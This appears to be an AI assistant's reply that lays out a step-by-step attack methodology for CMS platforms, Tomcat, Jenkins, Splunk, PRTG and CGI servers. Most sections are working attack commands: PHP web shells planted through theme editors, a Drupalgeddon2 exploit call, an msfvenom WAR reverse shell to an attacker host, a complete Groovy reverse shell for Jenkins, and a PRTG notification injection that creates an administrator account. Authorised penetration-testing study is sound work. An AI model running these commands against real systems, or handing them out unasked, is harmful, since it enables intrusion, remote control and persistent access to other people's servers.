Of course. Here is a comprehensive methodology for attacking common applications, created by structuring, refining, and extending the information you provided with additional context and techniques.

-----

# Web Application & Service Attack Methodology

This document outlines a structured approach for identifying, enumerating, and exploiting common web applications and services found during a penetration test.

## 1\. Initial Discovery & Enumeration (Mapping the Battlefield) üó∫Ô∏è

Before attacking a specific application, you must first map the entire attack surface.

### Port Scanning & Service Discovery

Identify open ports and the services running on them. Focus on common web ports but don't ignore non-standard ones.

```bash
# Scan for common web ports across a list of targets
nmap -p 80,443,8000,8080,8180,8888 --open -oA web_discovery -iL scope_list

# Perform a detailed service version scan on a specific target
nmap -sV -p- --open <target_ip>
```

### Visual Reconnaissance

Use screenshotting tools to quickly get a visual sense of the web applications you've discovered, helping you prioritize interesting or outdated-looking targets.

```bash
# Take screenshots of all discovered web services using Eyewitness
eyewitness --web -x web_discovery.xml -d eyewitness_report

# Alternatively, use Aquatone
cat web_discovery.xml | ./aquatone -nmap
```

### Directory & File Brute-Forcing

A critical step for every web application is to find hidden directories, files, and admin panels.

```bash
# Use ffuf to find directories and files
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<target>/FUZZ

# Look for specific file extensions
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<target>/FUZZ -e .php,.bak,.config,.txt
```

-----

## 2\. Attacking Content Management Systems (CMS) üìù

CMS platforms are ubiquitous and often vulnerable due to outdated versions, insecure plugins, or weak credentials. The general strategy is: **Identify Version -\> Scan -\> Exploit**.

### WordPress

The most popular CMS, making it a frequent target.

```bash
# Use wpscan to enumerate version, themes, plugins, and users
wpscan --url http://<target>/ --enumerate -t 50 --api-token <YOUR_API_TOKEN>

# Brute-force user passwords via XML-RPC to avoid UI lockouts
wpscan --url http://<target>/ --passwords /path/to/wordlist.txt --usernames admin,editor

# If you get admin access, upload a PHP reverse shell via the theme editor (e.g., in 404.php)
# <?php system($_GET['cmd']); ?>
curl http://<target>/wp-content/themes/themename/404.php?cmd=whoami
```

### Joomla

Another popular CMS with a history of critical vulnerabilities.

```bash
# Identify the version and scan for vulnerabilities
joomscan -u http://<target>/
droopescan scan joomla -u http://<target>/

# Brute-force the administrator login
joomla-brute.py -u http://<target> -w /path/to/wordlist.txt -usr admin

# With admin access, edit a template (e.g., error.php) to get RCE
# <?php system($_GET['cmd']); ?>
curl http://<target>/templates/protostar/error.php?cmd=id
```

### Drupal

Known for several highly critical, unauthenticated RCEs ("Drupalgeddon").

```bash
# Identify version and scan
droopescan scan drupal -u http://<target>

# Test for Drupalgeddon 2 (CVE-2018-7600)
python3 drupalgeddon2.py -u http://<target> -c "whoami"

# With admin access, enable the PHP Filter module and add PHP code to a page for RCE
# <?php system($_GET['cmd']); ?>
curl http://<target>/node/1?cmd=id
```

-----

## 3\. Attacking Application & Java Servers ‚òï

These platforms often host critical business logic and can provide deep access to the internal network if compromised.

### Apache Tomcat

A very common Java application server. The manager interface is a primary target.

```bash
# Enumerate the Tomcat Manager page and test default credentials (e.g., tomcat:tomcat)
# Metasploit has a great scanner: use scanner/http/tomcat_mgr_login

# If you gain access to the manager, deploy a malicious WAR file containing a JSP shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f war -o shell.war

# Upload shell.war through the manager UI and access it at http://<target>/shell/
```

  * Also, check for the **Ghostcat** vulnerability (CVE-2020-1938), which allows for Local File Inclusion (LFI) via the AJP connector (port 8009).

### Jenkins

An automation server that is a goldmine if compromised. The Script Console is a direct path to RCE on the server.

```groovy
// In the Jenkins Script Console (/script), run Groovy code for a reverse shell
String host="<attacker_ip>";
int port=4444;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

-----

## 4\. Attacking CI/CD & Management Platforms ‚öôÔ∏è

These tools often have high privileges and store sensitive secrets and code.

### GitLab

A popular DevOps platform. Look for outdated versions with known RCEs.

```bash
# Check for known vulnerabilities. A famous one was CVE-2021-22205 (ExifTool RCE)
# Search for public exploits for the specific GitLab version.

# User enumeration can be performed against the API
./gitlab_userenum.sh --url http://<target>/ --userlist users.txt
```

### Splunk

A data platform that can be extended with "apps." A malicious app can be used to get a shell.

```bash
# Check for default credentials (admin:changeme)
# If you gain access, package a reverse shell script into a Splunk app structure
# Example: reverse_shell_splunk/bin/run.sh
# Tar the directory: tar -cvzf revshell.tar.gz reverse_shell_splunk/

# Upload the malicious app via the UI and listen for the connection.
```

### PRTG Network Monitor

A monitoring tool where "Notifications" can be abused to execute code.

```powershell
# Check for default credentials (prtgadmin:prtgadmin)
# Go to Setup > Account Settings > Notifications > Add New Notification
# Set it to "Execute Program"
# For the Program/Script, enter a simple reverse shell payload.
# For Parameters, add your commands:
;net user prtgadm1 Pwn3d! /add;net localgroup administrators prtgadm1 /add
# Trigger the notification to execute the payload.
```

-----

## 5\. Exploiting Web Server & CGI Vulnerabilities üåê

Legacy configurations and technologies can be a soft spot.

### CGI Command Injection & Shellshock

Older CGI scripts often pass user input directly to shell commands.

```bash
# Test for Shellshock (CVE-2014-6271) on discovered CGI scripts
curl -H 'User-Agent: () { :; }; /bin/bash -c "sleep 5"' http://<target>/cgi-bin/test.cgi

# Look for command injection by adding shell characters like ; | &
http://<target>/cgi-bin/script.sh?file=;whoami
```

### IIS Tilde Enumeration

An information disclosure flaw in older IIS versions that reveals short names of files and directories.

```bash
# Use a scanner to find short names
java -jar iis_shortname_scanner.jar 0 5 http://<target>/
```

-----

## 6\. Advanced Application Analysis üî¨

### Thick Client Reverse Engineering

For Java-based thick clients (`.jar` files):

1.  **Intercept Traffic**: Configure the application to proxy through **Burp Suite** to analyze API requests.
2.  **Decompile**: Use a Java decompiler like **JD-GUI** or **JADX** to view the source code.
3.  **Analyze**: Look for hardcoded credentials, weak cryptography, or client-side logic flaws.
4.  **Modify & Recompile**: If needed, modify the source code, recompile (`javac`), and repackage the `.jar` file to exploit vulnerabilities.
